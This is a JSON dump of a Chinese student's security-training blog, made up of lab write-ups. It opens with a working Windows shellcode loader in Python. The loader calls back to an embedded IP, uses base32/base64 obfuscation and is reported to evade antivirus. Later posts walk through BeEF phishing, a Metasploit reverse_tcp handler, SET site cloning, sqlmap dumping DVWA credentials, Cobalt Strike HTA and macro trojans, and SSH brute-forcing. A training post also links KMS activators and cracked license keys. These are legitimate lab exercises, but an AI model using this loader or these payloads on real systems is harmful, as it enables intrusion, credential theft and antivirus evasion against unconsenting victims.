4\\xe5\\xc9\\xad\\xb7\\xfd\\xd9\\x13\\x72\\x8a\\xdd\\x13\\xc9\\xc1\\x62\\x89\\xeb\\xe4\\x0a\\xb6\\xcc\\xc3\\x4d\\x97\\xf0\\xc4\\xd2\\x8a\\x1a\\x4c\\x52\\x5c\\x04\\xb1\\xaa\\xc5\\x42\\xaf\\x31\\xef\\x1e\\xb7\\x0a\\xf5\\xd3\\xea\\x7a\\x58\\x00\\x55\\x73\\x65\\x72\\x2d\\x41\\x67\\x65\\x6e\\x74\\x3a\\x20\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x34\\x2e\\x30\\x20\\x28\\x63\\x6f\\x6d\\x70\\x61\\x74\\x69\\x62\\x6c\\x65\\x3b\\x20\\x4d\\x53\\x49\\x45\\x20\\x35\\x2e\\x30\\x3b\\x20\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x4e\\x54\\x3b\\x20\\x44\\x69\\x67\\x45\\x78\\x74\\x3b\\x20\\x44\\x54\\x53\\x20\\x41\\x67\\x65\\x6e\\x74\\x0d\\x0a\\x00\\x12\\xfb\\x77\\xa2\\x83\\x3b\\xab\\x20\\x14\\xd0\\xde\\x97\\xd9\\x52\\xe5\\x7d\\x73\\xb4\\xab\\x85\\xba\\x6e\\xd4\\xca\\xdc\\xce\\x99\\x2b\\xd7\\x24\\xfa\\x5f\\x68\\x01\\x8f\\x5d\\xbc\\x23\\x11\\x8d\\x31\\x7e\\x54\\x6f\\x0e\\xe6\\x07\\xe7\\x6a\\x34\\x3a\\xce\\x13\\x09\\xa1\\xc4\\xe0\\x28\\xde\\xaf\\x4e\\xf5\\xa8\\x0f\\x01\\xe7\\x48\\x8f\\x23\\x42\\x4c\\xd6\\x08\\x08\\x01\\xfa\\x3e\\x7d\\x48\\xef\\x29\\x1b\\x72\\xf3\\x70\\x01\\xdd\\x6d\\x9c\\x64\\x5b\\x51\\x66\\xef\\x59\\x59\\x9d\\xba\\x70\\xf4\\x03\\xa4\\xad\\x9d\\x2d\\xe2\\x57\\xcb\\x89\\x36\\x26\\x70\\x67\\xd7\\x17\\x48\\x10\\xf5\\x34\\x28\\x37\\x89\\xe5\\xc6\\xc2\\xf5\\x3d\\x75\\x9a\\xc7\\x0b\\xaf\\xac\\xa6\\xea\\xc4\\x9f\\x18\\x25\\x79\\x68\\x88\\x59\\x41\\x6e\\x22\\x18\\x63\\x52\\xf8\\xca\\x55\\x6b\\xf4\\x77\\xa2\\x77\\xb1\\x18\\x68\\xd6\\xb0\\xd8\\xfc\\xdf\\x7d\\x5d\\xbc\\x14\\x09\\x56\\x98\\xc9\\x70\\x82\\x40\\x05\\xf5\\x84\\xf4\\x86\\x0d\\xf0\\x6e\\x52\\x85\\xa9\\x0a\\x8f\\xbc\\x22\\x82\\xb9\\x25\\xbf\\x70\\x90\\x96\\xb2\\xb7\\x63\\xc4\\xba\\x85\\x97\\x4f\\xca\\x8d\\x92\\xec\\x07\\xa7\\xbb\\xbd\\xe7\\x1f\\x83\\xe7\\xc7\\x5c\\x1f\\x08\\x0b\\xad\\x00\\x41\\xbe\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x31\\xc9\\xba\\x00\\x00\\x40\\x00\\x41\\xb8\\x00\\x10\\x00\\x00\\x41\\xb9\\x40\\x00\\x00\\x00\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x48\\x89\\xda\\x41\\xb8\\x00\\x20\\x00\\x00\\x49\\x89\\xf9\\x41\\xba\\x12\\x96\\x89\\xe2\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x74\\xb6\\x66\\x8b\\x07\\x48\\x01\\xc3\\x85\\xc0\\x75\\xd7\\x58\\x58\\x58\\x48\\x05\\x00\\x00\\x00\\x00\\x50\\xc3\\xe8\\x9f\\xfd\\xff\\xff\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x31\\x38\\x39\\x2e\\x31\\x33\\x30\\x00\\x12\\x34\\x56\\x78&quot;shellcode = bytearray(shellcode)# 设置VirtualAlloc返回类型为ctypes.c_uint64ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64# 申请内存ptr = ctypes.windll.kernel32.VirtualAlloc(    ctypes.c_int(0),    ctypes.c_int(len(shellcode)),    ctypes.c_int(0x3000),    ctypes.c_int(0x40),)# 放入shellcodebuf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(    ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))string = &quot;LEZVENLDI5LHUTDOMRYGE3KSONREGNLSLJMEU5K2K53XUTLJGVJWIR3YJZRDGWTMKRLVM5DCGNFDKS2HJYYGKWCCNRRXSNLKLAZVM4DCNZITETSDNB3WISCJOBGEGQTJMRLVS42JI5HDAZKYIJWGG6JVNJMDE3DVMRBWQ422K42G6YZSNBWGER3YNJRDEUTMJNJWW4A=&quot;eval(base64.b64decode(base64.b32decode(string)))# 创建一个线程从shellcode防止位置首地址开始执行handle = ctypes.windll.kernel32.CreateThread(    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.c_uint64(ptr),    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.pointer(ctypes.c_int(0)),)# 等待上面创建的线程运行完ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))\n\n尝试使用 pyminifier 混淆\nliftoff&#x2F;pyminifier: Pyminifier is a Python code minifier, obfuscator, and compressor. (github.com)\n但是这个是 Python2 的环境，我所有环境都是 Python3，失败告终\n看了一眼兵哥的实验报告\n\n免杀成功\n\n\n\n上线\n","categories":["网络安全","实训","实验报告"],"tags":["网络安全实训","Kali","Pyinstaller"]},{"title":"网络安全实训1——网络钓鱼攻击","url":"/posts/1536eb66.html","content":"网络钓鱼攻击\n可能需要的：kali Linux 切换镜像源\n\n安装并启动\n利用 BeEF 进行网页钓鱼攻击\n利用 nodejs 开启静态服务\n补充利用 nodejs 开启静态服务\nsudo apt updatesudo apt install nodejs npm\n\n安装完成后进入你的静态文件所在目录\n开启命令行\nhttp-server\n\n\n\n成功上线\n发送警告命令\n通过 flash 钓鱼获取目标控制权msf6 &gt; handler -H 127.0.0.1 -P 4444 -p windows/meterpreter/reverse_tcp\n\n\n\n\n\n\n\n","categories":["网络安全","实训","实验报告"],"tags":["网络安全实训","网络钓鱼攻击"]},{"title":"网络安全实训2——ACL","url":"/posts/a3df68b9.html","content":"标准 IP 访问控制列表配置实验目标\n理解标准 IP 访问控制列表的原理及功能\n\n掌握编号的标准 IP 访问控制列表的配置方法\n\n\n实验背景网络配置要求公司的经理部、财务部和销售部门分属于不同的 3 个网段。三部门之间使用路由器进行信息传递。为了安全起见，公司领导要求以下访问控制：\n\n销售部门不能对财务部进行访问。\n经理部可以对财务部进行访问。\n\n部门主机代表\nPC1: 经理部的主机\nPC2: 销售部的主机\nPC3: 财务部的主机\n\n技术原理接入控制列表 (Access Control Lists, ACLs)接入控制列表（ACLs），也称访问控制列表（Access Lists），俗称防火墙，在有的文档中还称包过滤。ACLs 通过定义一些规则对网络设备接口上的数据包进行控制，允许通过或丢弃，从而提高网络可管理性和安全性。\nIP ACL 分类IP ACL 分为两种：标准 IP 访问列表和扩展 IP 访问列表。\n\n标准 IP 访问列表：编号范围为 1～99、1300～1999。可以根据数据包的源 IP 地址定义规则，进行数据包的过滤。\n扩展 IP 访问列表：编号范围为 100～199、2000～2699。可以根据数据包的原 IP、目的 IP、源端口、目的端口、协议来定义规则，进行数据包的过滤。\n\nIP ACL 应用IP ACL 基于接口进行规则的应用，分为入栈应用和出栈应用。\n实验步骤完成拓扑图的搭建\n配置 IP 地址\n\n\n配置 router0 联通的端口\n\n\n\n配置 router1 联通的端口\n\n配置 router0 的路由 IP 转发表\n配置 router1 的路由 IP 转发表\nPC0 ping 目标主机\nPC1 ping 目标主机\n配置 router0 的 IP 准入\n\nPC0 ping 主机\nPC1 ping 主机\n","categories":["网络安全","实训","实验报告"],"tags":["网络安全实训","ACL","访问控制列表"]},{"title":"网络安全实训3——远程控制","url":"/posts/e05ed2cb.html","content":"生成木马程序\n设置 IP 和端口\n运行木马\n反弹 shell\nADD +DEL+UPLOAD+DOWNDOAD\n\n\n","categories":["网络安全","实训","实验报告"],"tags":["网络安全实训","远程控制"]},{"title":"网络安全实训4——克隆网站","url":"/posts/bbe417ed.html","content":"Web 站点克隆钓鱼启动 SET\n选择模块\nPayload 选择\nPayload 设置\n返回数据\n\n不知道为啥返回的是 HTML 源码，但是后台可以看到数据\n把这段源码保存到本地打开就是登录界面\n\n","categories":["网络安全","实训","实验报告"],"tags":["网络安全实训","克隆网站"]},{"title":"网络安全实训5——扩展访问控制列表","url":"/posts/4702aed9.html","content":"拓扑图\n配置 PC0\n配置 server0\n配置路由器\n\nping测试\n配置router1\nping测试\n","categories":["网络安全","实训","实验报告"],"tags":["网络安全实训","扩展访问控制列表"]},{"title":"网络安全实训6——SQL注入","url":"/posts/b81117d1.html","content":"网络安全实训 6——SQL 注入安装环境知新平台的文档图片无法加载\n\n\n查看源码发现是外部引用，尝试恢复\n恢复成功\n\n开启 OWASP 靶机和 Kali 虚拟机登录 dvwa\n\n安全等级调 low\n\n进入 SQL Injection（Blind）页面\n\n随意输入一个数字，然后点击提交\n安装 SQLmap我用的是裸机当攻击机，所以安装个 SQLmap\n\n用 F12 打开开发者工具选中 Storage（存储）选项卡，找到 cookies，复制其中 PHPSESSID 的值（获取 cookies）得到 59mb9spqvkd9cuk543thagtsd5\n由于浏览器提交方式为 get 型，sqlmap 采用-u 命令。将刚才复制的 URL 和 COOKIE 写入命令\n\n出错了，查看 Github 的 README 发现是需要前面加 python 运行\n\n找到注入点\n\n为了查看有哪些数据库，输入命令：python sqlmap.py -u &quot;http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=59mb9spqvkd9cuk543thagtsd5&quot; --batch --dbs\n\n为了查看有当前数据库，输入命令python sqlmap.py -u &quot;http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=59mb9spqvkd9cuk543thagtsd5&quot; --batch --current-db\n\n为了查看数据库中所有的表，输入命令python sqlmap.py -u &quot;http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=59mb9spqvkd9cuk543thagtsd5&quot; --batch -D dvwa --tables\n\n为了查看 users 表中有哪些列，输入命令python sqlmap.py -u &quot;http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=59mb9spqvkd9cuk543thagtsd5&quot; --batch -D dvwa -T users --columns\n\n爆破表中 user 和 password 这两列python sqlmap.py -u &quot;http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=59mb9spqvkd9cuk543thagtsd5&quot; --batch -D dvwa -T users -C&quot;user,password&quot; --dump\n爆破成功\n\n上面有报错，问了下 ChatGPT-4o，也没啥有用的信息\n\n重试了一下正常了\n\n过程中的命令输入命令的时候容易出错的地方主要是：引号必须加，否则命令会被识别为系统&amp;命令，还有英文字符，写成中文字符会报错\n\npython sqlmap.py -u “http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch\n\npython sqlmap.py -u “http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch –dbs\n\npython sqlmap.py -u “http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch –current-db\n\npython sqlmap.py -u “http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch -D dvwa –tables\n\npython sqlmap.py -u “http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch -D dvwa –tables\n\npython sqlmap.py -u “http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch -D dvwa -T users –columns\n\npython sqlmap.py -u “http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id &#x3D; 1&amp;Submit &#x3D; Submit#” –cookie &#x3D; “security &#x3D; low; PHPSESSID &#x3D; 59mb9spqvkd9cuk543thagtsd5” –batch -D dvwa -T users -C “user, password” –dump\n\n\n","categories":["网络安全","实训","实验报告"],"tags":["网络安全实训","SQL注入"]},{"title":"网络安全实训7——MD5加盐","url":"/posts/51b71a30.html","content":"加密 expimport hashlibimport osdef generate_salt(length=16):    &quot;&quot;&quot;生成指定长度的盐值&quot;&quot;&quot;    return os.urandom(length)def md5_hash_with_salt(input_string, salt=None):    &quot;&quot;&quot;计算带盐值的MD5哈希&quot;&quot;&quot;    if salt is None:        salt = generate_salt()    hasher = hashlib.md5()    # 将输入字符串与盐值结合    hasher.update(input_string.encode(&quot;utf-8&quot;) + salt)    # 获取哈希值    hash_value = hasher.hexdigest()    return hash_value, saltprint(    &quot;&quot;&quot; .----------------.  .----------------.  .-----------------.  .----------------.  .----------------.  .----------------.| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || | _____  _____ | || |     __       | || | ____  _____  | || |  ________    | || |  ____  ____  | || |    _______   | || ||_   _||_   _|| || |    /  |      | || ||_   \\|_   _| | || | |_   ___ `.  | || | |_  _||_  _| | || |   /  ___  |  | || |  | | /\\ | |  | || |    `| |      | || |  |   \\ | |   | || |   | |   `. \\ | || |   \\ \\  / /   | || |  |  (__ \\_|  | || |  | |/  \\| |  | || |     | |      | || |  | |\\ \\| |   | || |   | |    | | | || |    \\ \\/ /    | || |   &#x27;.___`-.   | || |  |   /\\   |  | || |    _| |_     | || | _| |_\\   |_  | || |  _| |___.&#x27; / | || |    _|  |_    | || |  |`\\____) |  | || |  |__/  \\__|  | || |   |_____|    | || ||_____|\\____| | || | |________.&#x27;  | || |   |______|   | || |  |_______.&#x27;  | || |              | || |              | || |              | || |              | || |              | || |              | || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; | &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;W1ndys的MD5加盐程序，首次发布：https://blog.w1ndys.top/&quot;&quot;&quot;)input_string = input(&quot;请输入要加密的字符串: &quot;)hash_value, salt = md5_hash_with_salt(input_string)print(f&quot;输入字符串: &#123;input_string&#125;&quot;)print(f&quot;盐值: &#123;salt.hex()&#125;&quot;)print(f&quot;加盐前MD5哈希值: &#123;hashlib.md5(input_string.encode(&#x27;utf-8&#x27;)).hexdigest()&#125;&quot;)print(f&quot;加盐后MD5哈希值: &#123;hash_value&#125;&quot;)\n\n运行结果\n .----------------.  .----------------.  .-----------------.  .----------------.  .----------------.  .----------------.| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || | _____  _____ | || |     __       | || | ____  _____  | || |  ________    | || |  ____  ____  | || |    _______   | || ||_   _||_   _|| || |    /  |      | || ||_   \\|_   _| | || | |_   ___ `.  | || | |_  _||_  _| | || |   /  ___  |  | || |  | | /\\ | |  | || |    `| |      | || |  |   \\ | |   | || |   | |   `. \\ | || |   \\ \\  / /   | || |  |  (__ \\_|  | || |  | |/  \\| |  | || |     | |      | || |  | |\\ \\| |   | || |   | |    | | | || |    \\ \\/ /    | || |   &#x27;.___`-.   | || |  |   /\\   |  | || |    _| |_     | || | _| |_\\   |_  | || |  _| |___.&#x27; / | || |    _|  |_    | || |  |`\\____) |  | || |  |__/  \\__|  | || |   |_____|    | || ||_____|\\____| | || | |________.&#x27;  | || |   |______|   | || |  |_______.&#x27;  | || |              | || |              | || |              | || |              | || |              | || |              | || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; | &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;W1ndys的MD5加盐程序，首次发布：https://blog.w1ndys.top/请输入要加密的字符串: W1ndys输入字符串: W1ndys盐值: 6fb286108beb8146011e4df7b779ba10加盐前MD5哈希值: 4e9033367c1dcbf6df3b7ce889105a1d加盐后MD5哈希值: 8627b18f8c5f5c018649f472ad7fa776\n\n加盐前\n加盐后\n","categories":["网络安全","实训","实验报告"],"tags":["网络安全实训","MD5","加盐"]},{"title":"网络安全实训8——Wireshark抓取QQ图片","url":"/posts/16b47dd5.html","content":"抓包\n我是 png 文件，搜索 8950\n找到十六进制字符\n继续跟进\n\n\n删除多余数据\n查看图片可以看到已经抓取成功了，由于 QQ 压缩机制导致图片丢失内容过多\n\n原因与纠错测试发现从本机向其他人发送的图片会被切割，现在从手机端发给我的电脑\n\n再次抓包发现得到了全部的内容没有被切割。\n\n删除多余数据\n保存查看\n\n","categories":["网络安全","实训","实验报告"],"tags":["Wireshark","网络安全实训"]},{"title":"网络安全实训9——Office宏病毒","url":"/posts/7432ba23.html","content":"下载 CS我这里之前网络安全协会讲座测试环境的时候装过一次汉化版，考虑到实验环境，再下个老师给的 CS\n\n运行服务端给予服务端程序 teamserver 执行权限（在 linux 中复制进来的文件默认是没有执行权限的）chmod +x teamserver # 可以查看 kali 的 IP 地址（可选）ifconfig eth0 # # 运行服务端程序，192.168.0.104 是本机 IP，user   是要设置的连接密码（可改）./teamserver 192.168.0.104 user\n\n\n报错了，搜了一下，配置 java 环境变量：java 安装常见问题之 Kali 永久配置环境变量_kali 环境变量-CSDN 博客\n\n好吧还是不行，用我之前的版本的\n\n新建配置文件，连接 CS 服务器 \njava -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar\n\nadmin\nuser\n\n\n创建一个新的监听器 -&gt; 填写监听器名称（随便写，不重复就行）-&gt; 选择有效载荷&#x2F;攻击模块&#x2F;攻击方式\n\n添加 HTTP 主机\n\n添加要在开启监听的 HTTP 端口：0-65535  在这个取值范围中 1023 以下的端口已经分配给了常用的一些应用程序，建议往大的填，避免端口被占用（重复）–&gt; 最后保存即可\n\n攻击目标机器\nHTML Application（生成 hta HTML 应用程序）\n\n生成 hta 文件 （木马文件）\n\n文件下载\n我直接用本机测试了\n\n\n攻击目标机器 - 操控目标机器当有目标主机以任何方式运行了生成的被控端，出现在主机列表。\n选中要操作的目标主机 -&gt; 鼠标右键 -&gt; 进入 beacon（交互命令界面），在此使用 Beacon Commands 对目标主机执行各种操作。\n\n\n图形界面\n\n查看 IP\n\n使用文件管理\n\n获取目标的进程\n生成后门木马 - Office 宏病毒创建 Office 宏病毒 代码\n成功上线\n\n","categories":["网络安全","实训","实验报告"],"tags":["网络安全实训","Office宏病毒"]},{"title":"网络服务扫描实验","url":"/posts/98c41922.html","content":"\n老师发了个 ppt 复现一下，顺便发在博客上了\n\n网络服务扫描实验前期准备Metasploit 工具                        1 套\nPC 机（win10）                        1 台\n预习要求做好实验预习，复习网络服务有关内容。\n熟悉实验过程和基本操作流程。\n做好预习报告。\n实验任务扫描当前机器的网络服务\n实验环境一台安装了 Metasploit 的计算机。\n预备知识1.Telnet 服务相关知识\n2.SSH 服务相关知识\n3.数据库相关知识\n实验步骤1.Telnet_version 模块（1）使用 use 命令使用 telnet_version 模块。 msf &gt; use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version\n\n（2）通过 show 命令查看模块的设置选项。 msf auxiliary(telnet_version) &gt; show options\n\n\n其中 Name 表示的是需要设置的选项的名称，Current 表示的是该选项目前默认的设置值，Setting 表示是否进行了设置，Required 则表示的是该选项是否必须设置，yes 表示必须进行设置，而 no 则表示可以设置也可以不进行设置。Description 则表示的是对选项的介绍。最重要的选项是 RHOSTS，即目标地址范围或 CIDR 标识符。也就是要扫描的地址范围设置。\n\n（3）使用 set 命令设置目标地址范围。 msf auxiliary(telnet_version) &gt; set rhosts 10.10.10.0&#x2F;24\n设置后的界面显示如下所示：\n\n（4）使用 set 命令设置并发线程的数量。 msf auxiliary(telnet_version) &gt; set threads 100\n设置后的界面显示如下所示：\n\n（5）使用 run 命令来执行扫描。 msf auxiliary(telnet_version) &gt; run\n\n\n2.SSH_version 模块（1）使用 use 命令使用 ssh_version 模块。 msf &gt; use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version\n\n（2）通过 show 命令查看模块的设置选项。\n\n同 telnet_version 模块相同，ssh_version 扫描模块的设置选项也包括 Name、Current、Setting、Required 和 Description 五部分，所表示的含义也相同。\n\n（3）使用 set 命令设置目标地址范围。 msf auxiliary(ssh_version) &gt; set rhosts 10.10.10.0&#x2F;24\n\n（4）使用 set 命令设置并发线程的数量。 msf auxiliary(ssh_version) &gt; set threads 100\n\n（5）使用 run 命令来执行扫描。 msf auxiliary(ssh_version) &gt; run\n\n3.SSH_login 模块（1）使用 use 命令使用 ssh_login 模块。 msf &gt; use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login\n\n（2）通过 show 命令查看模块的设置选项。 msf auxiliary(ssh_login) &gt; show options\n\n\n与前面相比，ssh_login 模块用到的设置项多了很多。下面进行简单的介绍：\nBLANK_PASSWORDS，也就是空白密码的意思，即前面讲到的会先默认对空白密码进行验证。\nBRUTEFORCE_SPEED，暴力破解的速度，从 0 到 5 可选。\nPASSWORD，即准备暴力破解使用的密码，虽然不是必须的，但是没有进行暴力破解的密码，模块在验证完空密码后就停止了，因此这个其实是必须设置的。\nPASS_FILE，即准备暴力破解使用的密码文件，PASSWORD 是指定单个的密码，而 PASS_FILE 则是将密码字典放到一个文件里，并且每行只能放置一个密码。\nSTOP_ON_SUCCESS，即如果得到主机正在工作的消息，则停止试探密码，一般是设为 false 的。\nUSERNAME，同 PASSWORD 一样，虽然要求不是必须，但是在实际使用中是需要指定的。\nUSERPASS_FILE，是同时存储了密码和用户名的口令字典文件。每行包括一个用户名和对应的一个密码，中间用一个空格分隔开。\nUSER_AS_PASS，将所用用户名作为它的密码进行猜测。这在实际使用中很有用，因为经常有些安全意识薄弱的管理员这样设置密码。\nUSER_FILE，存储试探用户名的文件，同样每行一个用户名。\nVERBOSE，是否在窗口输出所有的尝试情况，默认是输出的。\n\n在口令猜测时明显需要设置的项或者说可以设置的项变的多了很多，这就需要根据实际情况来进行设置。下面，写一个简单的例子：\n根据上次实验的结果，选取 10.10.10.254\n（3）使用 set 命令设置目标地址范围。 msf auxiliary(ssh_login) &gt; set rhosts 10.10.10.254\n\n（4）使用 set 命令设置参数 username 的值。在这里仅尝试用户名为 root 的情况，因此代码如下：\n msf auxiliary(ssh_login) &gt; set username root\n\n（5）使用 set 命令设置参数 pass_file 的值。将名称为 words.txt 的密码字典放在了桌面，因此代码如下：\n msf auxiliary(ssh_login) &gt; set pass_file &#x2F;root&#x2F;Desktop&#x2F;words.txt\n\n（6）使用 set 命令设置并发线程的数量。 msf auxiliary(ssh_login) &gt; set threads 100\n\n（7）使用 run 命令来执行扫描。 msf auxiliary(ssh_login) &gt; run\n\n4.Mssql_ping 模块（1）使用 use 命令使用 mssql_ping 模块。 msf &gt; use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_ping \n\n（2）通过 show 命令查看模块的设置选项。 msf auxiliary(mssql_ping) &gt; show options\n\n\n与前面不同的是在 mssql_ping 模块用到了 USERNAME 设置项，这起始与 Microsoft SQL Server 安装时候的一个默认设置有关。在初次安装服务器的时候，会默认创建 sa 或系统管理员用户。因此，这里 USERNAME 设置项的默认设置是 sa，在这里也不准备进行更改。\n\n（3）使用 set 命令设置目标地址范围。 msf auxiliary(mssql_ping) &gt; set RHOSTS 202.118.176.0&#x2F;24\n\n（4）使用 set 命令设置并发线程的数量。 msf auxiliary(mssql_ping) &gt; set THREADS 50\n\n（5）使用 run 命令来执行扫描。 msf auxiliary(mssql_ping) &gt; run\n\n5.Tnslsnr_version 模块（1）使用 use 命令使用 tnslsnr_version 模块。 msf &gt; use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;tnslsnr_version \n\n（2）通过 show 命令查看模块的设置选项。 msf auxiliary(tnslsnr_version) &gt; show options\n\n（3）使用 set 命令设置目标地址范围。 msf auxiliary(tnslsnr_version)&gt; set RHOSTS 10.10.10.0&#x2F;24\n\n（4）使用 set 命令设置并发线程的数量。 msf auxiliary(tnslsnr_version) &gt; set THREADS 50\n\n（5）使用 run 命令来执行扫描。 msf auxiliary(tnslsnr_version) &gt; run\n\n","categories":["网络安全","网络服务扫描实验"],"tags":["网络安全","网络服务扫描实验"]},{"title":"网络部培训资料","url":"/posts/fcddcde4.html","content":"\n前排提示：在计算机的学习道路上，自学能力很重要，优秀的自学能力会引导你不断地获取新知识，加油，少年，当你有兴趣点开这一页，就意味着你会成为你心里的大佬的。\n遇到不会的问题，先尝试搜索，搜索引擎推荐 Google(需要科学上网) &gt; bing &gt; 其他\n如果搜不到再尝试问，提问的时候要保证提供尽可能多的报错、截图等信息\n\n\n本篇仅做 引导，本篇知识不仅可用于应付网络部培训，更深层的是学习一些计算机知识技能，以 提升自己\n\n计算机各种硬件的作用电脑各个硬件的作用 - 知乎 (zhihu.com)\n硬件基础：电脑当中各个硬件的作用介绍 - 知乎 (zhihu.com)\n挺好的 B 站专栏系列视频 ↓\n【最最基础的电脑硬件科普】第一期——CPU 篇\n【最最基础的电脑硬件科普】第二期——CPU 散热器篇\n【最最基础的电脑硬件科普】第三期——显卡篇\n【最最基础的电脑硬件科普】第四期——硬盘篇\n【最最基础的电脑硬件科普】第五期——内存篇\n【最最基础的电脑硬件科普】第六期——主板篇\nIP 地址知识计算机网络基础：IP 基础知识笔记 - 知乎 (zhihu.com)\n拓展知识：计算机网络 - IPv4 常考知识点详解(超详细！)_ipv4 分组-CSDN 博客（比较深度，不需要全会，了解即可，提醒一下这是计算机网络的必修知识点，需要必修计算机网络的同学可以提前学习，子网划分是必考大题）\n硬盘内存等内存、外存、硬盘、磁盘、闪存，傻傻分不清？_硬盘内存是 ddr3 吗-CSDN 博客\n小白科普：想不清楚内存与硬盘有啥区别？读完这篇就懂了 - 哔哩哔哩 (bilibili.com)\n解压缩三款知名度很高的解压软件：7-Zip、WinRAR、Bandizip - 知乎 (zhihu.com)\nGithub 的注册使用这里提一点 Github 的访问，由于 Github 在国内属于半墙状态，所以不得不通过一些工具进行加速\n瓦特工具箱(Steam++官网) - Watt Toolkit (steampp.net)\n瓦特工具箱最初是用于加速 Steam 后来也支持加速 Github，并且是合法合规的软件，且完全免费，可以使用这个工具解决访问问题，以及 Git 的代码推送，代码克隆等\n\n不过在某种情况下，也许需要和某种“工具”配合使用（一种可以访问国内无法访问的工具，由于内容涉敏这里不多说，有需要可以单独找我）\n\noffice 激活重点：KMS 激活工具的使用\nOffice Tool Plus | 一键部署 Office (landian.vip)\nReleases · zbezj&#x2F;HEU_KMS_Activator (github.com)\n系统重装篇手把手教你如何重装 win10 系统，自己动手安装系统其实很简单 (zhihu.com)\n分盘\n电脑分盘怎么分？分盘详细教程来了，图文教学-CSDN 博客\n\n借助第三方工具：下载分区助手 (disktool.cn)\n\n\n数据恢复DiskGenius 数据恢复详细教程\nDiskGenius – 正式版下载|免费下载\nPE 系统仅用于了解什么是 PE：电脑高手必备 - 什么是 PE？ - 知乎 (zhihu.com)\n推荐 PE 系统：Ventoy+WePE 装机教程 - 逍遥隐士 - 博客园 (cnblogs.com)\nVMware Workstation 虚拟机合集+激活密钥VMware Workstation 虚拟机合集+激活密钥_Win+Linux_10∕11∕12∕14∕15∕16∕17 - 吾爱破解 - 52pojie.cn\n","categories":["网络部"],"tags":["网络部"]},{"title":"解决Windows11“为了对电脑进行保护，已经阻止此应用。”","url":"/posts/8847716f.html","content":"\n有时候安装客户端的时候会遇到这种情况\n然而网上的方法对于家庭版电脑并不适用\n但是我们可以通过命终端来解决\n首先右键开始菜单\n\n点击Windows终端（管理员）\n一定要选择管理员终端\n然后切换到exe所在的目录\n\n然后输入待安装文件名（不要丢掉后缀名）\n\n结束！祝你学得开心！\n","categories":["技术教程","Windows"],"tags":["Windows技术分享"]},{"title":"记一次Github actions的学习","url":"/posts/dce14753.html","content":"前言事情是怎么一回事呢，一直以来，我的 Easy-QFNU 的日期更新因为插件不适配，导致日期我一直没用，就自己手搓的日期编辑，硬解码，一开始是手动编辑，后来感觉效率太低了，就搓了个 Python 脚本来实现批量更新，但是后来又觉得不够灵活，就想着用 Github actions 